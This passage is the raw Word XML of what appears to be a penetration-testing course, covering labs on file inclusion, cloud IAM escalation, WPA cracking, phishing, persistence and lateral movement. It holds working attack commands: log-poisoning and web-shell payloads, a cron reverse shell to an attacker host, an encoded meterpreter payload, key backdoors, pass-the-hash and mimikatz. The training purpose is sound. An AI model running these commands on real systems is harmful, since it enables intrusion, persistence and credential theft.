        <w:t>http://127.0.0.1/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Poison the Apache access log with a PHP payload</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>curl -A '&lt;?php system($_GET["c"]); ?&gt;' http://127.0.0.1/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Include the poisoned log to gain RCE</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>http://127.0.0.1/vulnerabilities/fi/?page=/var/log/apache2/access.log&amp;c=id</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Host a remote shell for RFI</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>python3 -m http.server 8080</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Trigger the remote file inclusion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>http://target/page?file=http://&lt;KALI&gt;:8080/shell.php&amp;c=id</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Drop a stealthy weevely web shell</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>weevely generate Spring2026 /tmp/sh.php; weevely http://target/sh.php Spring2026</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Test it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Including the poisoned log executes id and returns the command output in the HTTP response.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labs/lab-29-*.md. Only run these techniques against systems you own or are authorised to test.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 30 — Cloud Attacks: S3 and IAM with Pacu and ScoutSuite</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exam objective: 4.6 Cloud-based attacks — IAM misconfig, exposed storage, metadata service, supply chain, container escape; Pacu, ScoutSuite, Prowler, Cloud-Bench..</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: The learner audits a misconfigured AWS environment with ScoutSuite and Prowler, then exploits an IAM privilege-escalation chain with Pacu.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>What you'll build</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Backdoor AWS admin access obtained from an IAM privilege-escalation chain.   (Tools: Pacu, ScoutSuite, Prowler, CloudGoat, s3scanner, AWS CLI.)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the cloud pentest tooling</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>pip install --upgrade pacu scoutsuite prowler-cloud cloudgoat</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Deploy a vulnerable CloudGoat scenario</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>./cloudgoat.py create iam_privesc_by_attachment</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Recon misconfigurations with ScoutSuite</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>scout aws --profile cg-starter -r us-east-1 --report-dir scout-report</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Run a CIS compliance scan with Prowler</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>prowler aws --compliance cis_2.0_aws -p cg-starter</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Enumerate the user's IAM permissions in Pacu</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>run iam__enum_permissions</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Find IAM privilege-escalation paths</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>run iam__privesc_scan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Backdoor the user's access keys</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>run iam__backdoor_users_keys --usernames cg-starter</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Hunt for exposed S3 buckets</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>s3scanner scan -b acme-prod-logs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Destroy the CloudGoat scenario to stop costs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>./cloudgoat.py destroy iam_privesc_by_attachment</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Test it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Pacu reports an IAM privesc path and creates backdoor admin keys for cg-starter.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labs/lab-30-*.md. Only run these techniques against systems you own or are authorised to test.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 31 — Wireless Attacks: WPA Cracking with Aircrack-ng</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exam objective: 4.7 Wireless attacks — wardriving, evil twin, deauth, WPS PIN, captive portal; tools Aircrack-ng, Kismet, WiGLE, InSSIDer..</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: The learner captures a WPA2 four-way handshake using a deauth burst then cracks the passphrase offline.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>What you'll build</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>A cracked WPA2 passphrase recovered from a captured handshake or PMKID.   (Tools: Aircrack-ng, airodump-ng, aireplay-ng, hcxdumptool, hashcat, reaver.)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Put the Wi-Fi adapter into monitor mode</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo airmon-ng check kill; sudo airmon-ng start wlan0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Scan the air for nearby access points</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo airodump-ng wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Capture on the target BSSID and channel</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo airodump-ng --bssid &lt;BSSID&gt; -c &lt;CH&gt; -w cap wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Deauth a client to force a re-handshake</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo aireplay-ng -0 5 -a &lt;BSSID&gt; -c &lt;CLIENT-MAC&gt; wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Crack the handshake with aircrack-ng</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>aircrack-ng -w /usr/share/wordlists/rockyou.txt -b &lt;BSSID&gt; cap-01.cap</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Convert and GPU-crack with hashcat</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>hcxpcapngtool -o handshake.hc22000 cap-01.cap; hashcat -m 22000 handshake.hc22000 /usr/share/wordlists/rockyou.txt -r best64.rule</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Capture a client-less PMKID</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo hcxdumptool -i wlan0mon -w pmkid.pcapng --enable_status=1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Scan for and brute-force a WPS PIN</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo reaver -i wlan0mon -b &lt;BSSID&gt; -c &lt;CH&gt; -vv</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Test it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>aircrack-ng or hashcat recovers the WPA2 passphrase from the capture file.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labs/lab-31-*.md. Only run these techniques against systems you own or are authorised to test.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 32 — Social Engineering with GoPhish and SET</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exam objective: 4.8 Social engineering — phishing, spearphishing, whaling, credential harvesting, watering hole; SET, GoPhish, Evilginx..</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: The learner runs a controlled GoPhish phishing campaign against a test mailbox and clones a login page with SET.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>What you'll build</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>A phishing campaign with a cloned landing page and captured credential submissions.   (Tools: GoPhish, SET (setoolkit), MailHog, Evilginx2.)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and start the GoPhish server</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo gophish</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Run a MailHog catcher for the sending profile</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo docker run --rm -d --name mh -p 1025:1025 -p 8025:8025 mailhog/mailhog</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Clone a real login page as the landing page</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Author a spear-phish email template with merge tags</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Import target users from CSV and launch the campaign</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Clone a login with the SET credential harvester</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo setoolkit</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Deploy Evilginx2 to capture MFA session cookies</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo evilginx</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Review the campaign click and submit metrics</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Test it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The GoPhish dashboard shows Sent, Opened, Clicked and Submitted Data for the campaign.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labs/lab-32-*.md. Only run these techniques against systems you own or are authorised to test.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Topic 05 — Post-exploitation and Lateral Movement  (14%)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Persistence · CrackMapExec &amp; Impacket · Pivoting · Exfiltration · Cleanup &amp; Preservation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Persistence keeps access across reboots (cron, systemd services, web shells, scheduled tasks) and demonstrates the real risk of an initial compromise.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Lateral movement reuses captured credentials and hashes (CrackMapExec, Impacket pass-the-hash) to move from one host to the next across a network.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Pivoting and tunnelling (sshuttle, Chisel, Proxychains) reach otherwise-unreachable internal segments; exfiltration testing (DNS, ICMP, HTTPS) validates data-loss controls.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Professional engagements end with cleanup: remove tooling and persistence, restore changed state, and preserve artifacts and evidence for the report.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 33 — Establishing Persistence (cron, systemd, web shell)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exam objective: Establish persistence with scheduled tasks, services, backdoors and C2.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: The learner establishes and documents multiple persistence mechanisms on a compromised host — a cron job, a systemd service, an authorized SSH key, a PHP web shell and a generated payload.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>What you'll build</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>A set of documented persistence artefacts (cron, systemd, SSH key, web shell, payload) on the compromised host   (Tools: cron, systemd, OpenSSH, weevely, msfvenom, netcat.)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Install a cron-based reverse-shell backdoor</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>echo '* * * * * root bash -c "bash -i &gt;&amp; /dev/tcp/&lt;KALI&gt;/4444 0&gt;&amp;1"' | sudo tee /etc/cron.d/sysupdate</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Catch the callback with a netcat listener</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>nc -lvnp 4444</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Create a systemd service that reconnects on boot</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo systemctl enable --now sys-helper.service</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Add an attacker SSH key for key-based access</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>echo 'ssh-ed25519 AAAA...  attacker@kali' &gt;&gt; /root/.ssh/authorized_keys</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Drop a PHP web shell into the web root</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo tee /var/www/html/.cache.php &lt;&lt;&lt; '&lt;?php if(isset($_REQUEST["c"])) system($_REQUEST["c"]); ?&gt;'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Generate a stealthier web shell with weevely</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>weevely generate Spring2026 /tmp/sh.php</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Generate a Windows meterpreter payload with msfvenom</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;KALI&gt; LPORT=4444 -f exe -o agent.exe -e x64/xor -i 5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Document every persistence artefact for cleanup</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Test it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Confirm each persistence mechanism triggers a callback or shell, and that every artefact is recorded in your persistence inventory so it can be removed during cleanup.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labs/lab-33-*.md. Only run these techniques against systems you own or are authorised to test.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 34 — Lateral Movement with CrackMapExec and Impacket</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exam objective: Move laterally using captured credentials and hashes across SMB, WMI and WinRM.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: The learner uses captured credentials to enumerate and execute commands across a Windows network, dumps further credentials, and moves laterally with pass-the-hash and pass-the-ticket.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>What you'll build</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Command execution and interactive shells on additional hosts reached with reused credentials and hashes   (Tools: CrackMapExec, Impacket (psexec/wmiexec/atexec), evil-winrm, mimikatz.)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Sweep the subnet for SMB hosts with CrackMapExec</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>crackmapexec smb 10.0.0.0/24</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Spray a known credential and enumerate shares/users</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>crackmapexec smb &lt;ip&gt; -u svc_sql -p 'Summer2025' --shares --users</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Execute a command over SMB</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>crackmapexec smb &lt;ip&gt; -u svc_sql -p 'Summer2025' -x 'whoami /all'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Get an interactive shell with Impacket PsExec</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>impacket-psexec corp.local/svc_sql:Summer2025@&lt;ip&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Get a shell over WinRM with evil-winrm</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>evil-winrm -i &lt;ip&gt; -u svc_sql -p 'Summer2025'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Dump credentials from the new host with mimikatz</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sekurlsa::logonpasswords</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Reuse an NT hash with pass-the-hash</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>impacket-psexec -hashes :&lt;NT-hash&gt; corp.local/Administrator@&lt;ip&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Reuse a Kerberos ticket with pass-the-ticket</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>export KRB5CCNAME=ticket.ccache; impacket-psexec -k -no-pass corp.local/svc_sql@target.corp.local</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Test it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
